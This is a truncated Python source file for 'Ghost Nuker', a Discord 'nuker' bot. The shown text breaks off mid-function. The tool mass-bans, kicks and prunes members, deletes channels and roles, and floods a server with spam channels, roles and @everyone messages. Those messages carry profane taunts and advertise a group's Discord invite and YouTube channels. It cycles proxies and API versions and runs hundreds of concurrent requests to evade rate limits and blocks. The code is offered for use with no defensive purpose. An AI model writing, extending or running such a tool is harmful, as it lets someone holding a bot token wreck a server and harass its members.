import asyncio
import aiohttp
import discord
from discord.ext import commands
from itertools import cycle
import random
import json
import os
import webbrowser
import base64
from datetime import datetime
import time

VERSION = '2.1.4'

PINK_START = (75, 0, 130)
PINK_END = (255, 0, 255)
GREEN_START = (0, 34, 0)
GREEN_END = (0, 255, 0)
RED_START = (51, 0, 0)
RED_END = (255, 102, 102)

def gradient_text(text, start_color, end_color, bold=True):
    def rgb_to_256(r, g, b):
        r = round(r / 255 * 5)
        g = round(g / 255 * 5)
        b = round(b / 255 * 5)
        return 16 + (36 * r) + (6 * g) + b

    result = "\033[1m" if bold else ""
    length = len(text)
    for i, char in enumerate(text):
        ratio = i / max(length - 1, 1)
        r = int(start_color[0] + (end_color[0] - start_color[0]) * ratio)
        g = int(start_color[1] + (end_color[1] - start_color[1]) * ratio)
        b = int(start_color[2] + (end_color[2] - start_color[2]) * ratio)
        color_code = rgb_to_256(r, g, b)
        result += f"\033[38;5;{color_code}m{char}"
    result += "\033[0m"
    return result

def format_log_message(status, message, padding=50):
    timestamp = f"[{datetime.now():%Y-%m-%d %H:%M:%S}]"
    if status == "SUCCESS":
        full_message = f"{timestamp} (+) SUCCESS 【●】 ➪  {message:<{padding}}"
        return gradient_text(full_message, GREEN_START, GREEN_END, bold=True)
    elif status == "ERROR":
        full_message = f"{timestamp} (+) ERROR 【●】 ➪  {message:<{padding}}"
        return gradient_text(full_message, RED_START, RED_END, bold=True)
    else:
        full_message = f"{timestamp} (+) INFO 【●】 ➪  {message:<{padding}} │"
        return gradient_text(full_message, PINK_START, PINK_END, bold=True)

__intents__ = discord.Intents.default()
__intents__.members = True
__client__ = commands.Bot(command_prefix="+", help_command=None, intents=__intents__)

__config__ = None
config_folder = "configs"

os.system("cls") if os.name == "nt" else os.system("clear")

print(format_log_message("INFO", "Load config file or manual input? [c/m]", 50))
config_choice = input().strip().lower()

if config_choice == 'm':
    token = input(format_log_message("INFO", "Enter bot token", 50)).strip()
    if not token:
        print(format_log_message("ERROR", "Token is required!", 47))
        os._exit(1)
    max_concurrent = input(format_log_message("INFO", "Enter max concurrent tasks (default 200)", 50)).strip()
    max_concurrent = int(max_concurrent) if max_concurrent.isdigit() else 200
    use_proxy = input(format_log_message("INFO", "Use proxies? [y/n]", 50)).strip().lower() == 'y'
    __config__ = {
        "token": token,
        "max_concurrent": max_concurrent,
        "proxy": use_proxy,
        "nuke": {
            "channel_names": ["nuked by wizzlers", "wizzed by wizzlers", "fucked by wizzlerd"],
            "roles_name": ["stfu wizzlers run you", "wizzlers owns you", "wizzlers fucked your ass"],
            "messages_content": ["@everyone @here Nuked by wizzlers join https://discord.gg/wizzlers and subscribe  https://youtube.com/@hatedshakti https://youtube.com/@wizzlersop ", "@everyone @here wizzlers wizzed you join https://discord.gg/wizzlers and subscribe  https://youtube.com/@hatedshakti https://youtube.com/@wizzlersop ", "@everyone @here destroyed by wizzlers join https://discord.gg/wizzlers and subscribe  https://youtube.com/@hatedshakti https://youtube.com/@wizzlersop "]
        }
    }
    print(format_log_message("SUCCESS", "Manual configuration loaded", 33))

    os.system("cls") if os.name == "nt" else os.system("clear")
else:
    os.system("cls") if os.name == "nt" else os.system("clear")
    if not os.path.exists(config_folder):
        print(format_log_message("ERROR", "'configs' folder not found.", 50))
        os._exit(1)

    config_files = [f for f in os.listdir(config_folder) if f.endswith(".json")]
    if not config_files:
        print(format_log_message("ERROR", "No JSON files found in 'configs' folder.", 50))
        os._exit(1)

    print(format_log_message("INFO", "Available Configs:", 50))
    print(gradient_text("╭" + "─" * 60 + "╮", PINK_START, PINK_END, bold=True))
    for i, config_file in enumerate(config_files, 1):
        print(gradient_text(f"│{i:<2}│ {config_file:<56}│", PINK_START, PINK_END, bold=True))
    print(gradient_text("╰" + "─" * 60 + "╯", PINK_START, PINK_END, bold=True))

    try:
        choice = int(input(format_log_message("INFO", "Choose config number", 50)).strip()) - 1
        if 0 <= choice < len(config_files):
            config_path = os.path.join(config_folder, config_files[choice])
            __config__ = json.load(open(config_path, "r", encoding="utf-8"))
            print(format_log_message("SUCCESS", f"Loaded {gradient_text(config_files[choice], PINK_START, PINK_END, bold=True)}", 56))
        else:
            print(format_log_message("ERROR", "Invalid choice!", 49))
            os._exit(1)
    except (ValueError, IndexError):
        print(format_log_message("ERROR", "Invalid input! Please enter a number.", 33))
        os._exit(1)

token = __config__["token"]
__max_concurrent__ = __config__.get("max_concurrent", 400)

os.system("cls") if os.name == "nt" else os.system("clear")

console_width = 140
new_banner = """
▓█▀▀█ ▒█░▒█ ▒█▀▀▀█ ▒█▀▀▀█ ▀▀█▀▀ 　 ▒█▄░▒█ ▒█░▒█ ▒█░▄▀ ▒█▀▀▀ ▒█▀▀█
▒█░▄▄ ▒█▀▀█ ▒█░░▒█ ░▀▀▀▄▄ ░▒█░░ 　 ▒█▒█▒█ ▒█░▒█ ▒█▀▄░ ▒█▀▀▀ ▒█▄▄▀
▒█▄▄█ ▒█░▒█ ▒█▄▄▄█ ▒█▄▄▄█ ░▒█░░ 　 ▒█░░▀█ ░▀▄▄▀ ▒█░▒█ ▒█▄▄▄ ▒█░▒█
""".rstrip('\n').split('\n')
new_banner = '\n'.join(gradient_text(line.center(console_width), PINK_START, PINK_END, bold=True) for line in new_banner)

options = """
╭───────────────────────────────────────────────────────────────────────────────────────────────────────────╮
│                                               GHOST NUKER                                                 │
├───────────────────────────────────┬───────────────────────────────────┬───────────────────────────────────┤
│ <01> Ban Members                  │ <07> Delete Roles                 │ <13> Change Icon                  │
│ <02> Kick Members                 │ <08> Delete Emojis                │ <14> Change Guild                 │
│ <03> Prune Members                │ <09> Spam Channels                │ <15> Give Admin                   │
│ <04> Create Channels              │ <10> Check Updates                │ <16> Delete Invites               │
│ <05> Create Roles                 │ <11> Credits                      │ <17> Switch Guild                 │
│ <06> Delete Channels              │ <12> Nick All                     │ <18> Exit                         │
╰───────────────────────────────────┴───────────────────────────────────┴───────────────────────────────────┴
""".rstrip('\n').split('\n')
options = '\n'.join(gradient_text(line.center(console_width), PINK_START, PINK_END, bold=True) for line in options)

class shakti:
    def __init__(self, guildid, client):
        self.guildid = guildid
        self.guild = None
        self.client = client
        self.has_proxies = False
        self.proxy_count = 0
        try:
            with open("proxies.txt", "r") as f:
                proxy_list = f.read().splitlines()
            if not proxy_list:
                print(format_log_message("ERROR", "proxies.txt is empty. Disabling proxies.", 28))
            else:
                valid_proxies = []
                for proxy in proxy_list:
                    proxy = proxy.strip()
                    if proxy and ":" in proxy:
                        host, port = proxy.rsplit(":", 1)
                        if port.isdigit():
                            valid_proxies.append(proxy)
                        else:
                            print(format_log_message("ERROR", f"Invalid proxy port in '{gradient_text(proxy, PINK_START, PINK_END, bold=True)}'. Skipping.", 19))
                    else:
                        print(format_log_message("ERROR", f"Invalid proxy format: '{gradient_text(proxy, PINK_START, PINK_END, bold=True)}'. Skipping.", 16))
                if not valid_proxies:
                    print(format_log_message("ERROR", "No valid proxies found. Disabling proxies.", 23))
                else:
                    self.proxy_cycle = cycle(valid_proxies)
                    self.has_proxies = True
                    self.proxy_count = len(valid_proxies)
                    print(format_log_message("SUCCESS", f"Loaded {gradient_text(str(len(valid_proxies)), GREEN_START, GREEN_END, bold=True)} valid proxies for rotation.", 17))
        except FileNotFoundError:
            print(format_log_message("ERROR", "proxies.txt not found. Disabling proxies.", 24))
        except Exception as e:
            print(format_log_message("ERROR", f"Error reading proxies: {str(e)}", 15))

        self.version = cycle(['v10', 'v9'])
        self.banned = []
        self.kicked = []
        self.channels = []
        self.roles = []
        self.emojis = []
        self.messages = []
        self.semaphore = asyncio.Semaphore(__max_concurrent__)

    async def async_input(self, prompt: str):
        return await self.client.loop.run_in_executor(None, lambda: input(prompt))

    async def _get_session(self):
        proxy_host = None
        if __config__["proxy"] and self.has_proxies:
            proxy_host = next(self.proxy_cycle)
        proxy = f"http://{proxy_host}" if proxy_host else None
        return aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(limit=5000),
            timeout=aiohttp.ClientTimeout(total=None),
            connector_owner=True
        )

    async def execute_ban(self, member: str, token: str):
        async with self.semaphore:
            payload = {"delete_message_days": random.randint(0, 7)}
            async with await self._get_session() as session:
                try:
                    async with session.put(
                        f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/bans/{member}",
                        headers={"Authorization": f"Bot {token}"}, json=payload
                    ) as response:
                        if response.status in [200, 201, 204]:
                            print(format_log_message("SUCCESS", f"Banned {member}", 52))
                            self.banned.append(member)
                            return True
                        elif "Missing Permissions" in await response.text():
                            print(format_log_message("ERROR", f"Missing Permissions for {member}", 41))
                            return False
                        elif response.status == 429:
                            return False
                        elif "You are being blocked" in await response.text():
                            print(format_log_message("ERROR", "Blocked from Discord API", 40))
                            return False
                        elif "Max number of bans" in await response.text():
                            print(format_log_message("ERROR", "Max bans exceeded", 47))
                            return False
                        else:
                            print(format_log_message("ERROR", f"Failed to ban {member}", 46))
                            return False
                except Exception as e:
                    print(format_log_message("ERROR", f"Failed to ban {member} | {e}", 46))
                    return False

    async def execute_kick(self, member: str, token: str):
        async with self.semaphore:
            async with await self._get_session() as session:
                try:
                    async with session.delete(
                        f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/members/{member}",
                        headers={"Authorization": f"Bot {token}"}
                    ) as response:
                        if response.status in [200, 201, 204]:
                            print(format_log_message("SUCCESS", f"Kicked {member}", 52))
                            self.kicked.append(member)
                            return True
                        elif "Missing Permissions" in await response.text():
                            print(format_log_message("ERROR", f"Missing Permissions for {member}", 41))
                            return False
                        elif response.status == 429:
                            return False
                        elif "You are being blocked" in await response.text():
                            print(format_log_message("ERROR", "Blocked from Discord API", 40))
                            return False
                        else:
                            print(format_log_message("ERROR", f"Failed to kick {member}", 46))
                            return False
                except Exception as e:
                    print(format_log_message("ERROR", f"Failed to kick {member} | {e}", 46))
                    return False

    async def execute_prune(self, days: int, token: str):
        async with self.semaphore:
            async with await self._get_session() as session:
                try:
                    payload = {"days": days}
                    async with session.post(
                        f"https://discord.com/api/v10/guilds/{self.guildid}/prune",
                        headers={"Authorization": f"Bot {token}"}, json=payload
                    ) as response:
                        if response.status == 200:
                            pruned = (await response.json()).get('pruned', 0)
                            print(format_log_message("SUCCESS", f"Pruned {pruned} members", 43))
                            return pruned
                        elif "Missing Permissions" in await response.text():
                            print(format_log_message("ERROR", "Missing Permissions for pruning", 35))
                        elif response.status == 429:
                            pass
                        elif "Max number of prune" in await response.text():
                            print(format_log_message("ERROR", "Max prune reached", 46))
                        elif "You are being blocked" in await response.text():
                            print(format_log_message("ERROR", "Blocked from Discord API", 40))
                        else:
                            print(format_log_message("ERROR", "Failed to prune members", 41))
                        return 0
                except Exception as e:
                    print(format_log_message("ERROR", f"Failed to prune members | {e}", 41))
                    return 0

    async def execute_crechannels(self, channelsname: str, type_: int, token: str):
        async with self.semaphore:
            payload = {"type": type_, "name": channelsname.replace(" ", "-"), "permission_overwrites": []}
            async with await self._get_session() as session:
                try:
                    async with session.post(
                        f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/channels",
                        headers={"Authorization": f"Bot {token}"}, json=payload
                    ) as response:
                        if response.status == 201:
                            channel_id = (await response.json())['id']
                            print(format_log_message("SUCCESS", f"Created channel ID {channel_id}", 42))
                            self.channels.append(1)
                            return True
                        elif "Missing Permissions" in await response.text():
                            print(format_log_message("ERROR", f"Missing Permissions for #{payload['name']}", 35))
                            return False
                        elif response.status == 429:
                            return False
                        elif "You are being blocked" in await response.text():
                            print(format_log_message("ERROR", "Blocked from Discord API", 40))
                            return False
                        else:
                            print(format_log_message("ERROR", f"Failed to create #{payload['name']}", 40))
                            return False
                except Exception as e:
                    print(format_log_message("ERROR", f"Failed to create #{payload['name']} | {e}", 40))
                    return False

    async def execute_creroles(self, rolesname: str, token: str):
        async with self.semaphore:
            colors = random.choice([0x0000FF, 0xFFFFFF, 0xFF0000, 0x00FF00, 0x0000FF, 0xFFFF00, 0x00FFFF, 0xFF00FF, 0xC0C0C0, 0x808080, 0x800000, 0x808000, 0x008000, 0x800080, 0x008080, 0x000080])
            payload = {"name": rolesname, "color": colors}
            async with await self._get_session() as session:
                try:
                    async with session.post(
                        f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/roles",
                        headers={"Authorization": f"Bot {token}"}, json=payload
                    ) as response:
                        if response.status == 200:
                            role_id = (await response.json())['id']
                            print(format_log_message("SUCCESS", f"Created role ID {role_id}", 45))
                            self.roles.append(1)
                            return True
                        elif "Missing Permissions" in await response.text():
                            print(format_log_message("ERROR", f"Missing Permissions for @{rolesname}", 35))
                            return False
                        elif response.status == 429:
                            return False
                        elif "You are being blocked" in await response.text():
                            print(format_log_message("ERROR", "Blocked from Discord API", 40))
                            return False
                        else:
                            print(format_log_message("ERROR", f"Failed to create @{rolesname}", 40))
                            return False
                except Exception as e:
                    print(format_log_message("ERROR", f"Failed to create @{rolesname} | {e}", 40))
                    return False

    async def execute_delchannels(self, channel: str, token: str):
        async with self.semaphore:
            async with await self._get_session() as session:
                try:
                    async with session.delete(
                        f"https://discord.com/api/{next(self.version)}/channels/{channel}",
                        headers={"Authorization": f"Bot {token}"}
                    ) as response:
                        if response.status == 200:
                            print(format_log_message("SUCCESS", f"Deleted channel {channel}", 42))
                            self.channels.append(channel)
                            return True
                        elif "Missing Permissions" in await response.text():
                            print(format_log_message("ERROR", f"Missing Permissions for {channel}", 35))
                            return False
                        elif response.status == 429:
                            return False
                        elif "You are being blocked" in await response.text():
                            print(format_log_message("ERROR", "Blocked from Discord API", 40))
                            return False
                        else:
                            print(format_log_message("ERROR", f"Failed to delete {channel}", 44))
                            return False
                except Exception as e:
                    print(format_log_message("ERROR", f"Failed to delete {channel} | {e}", 44))
                    return False

    async def execute_delroles(self, role: str, token: str, retries=3, base_delay=1.0):
        async with self.semaphore:
            for attempt in rang
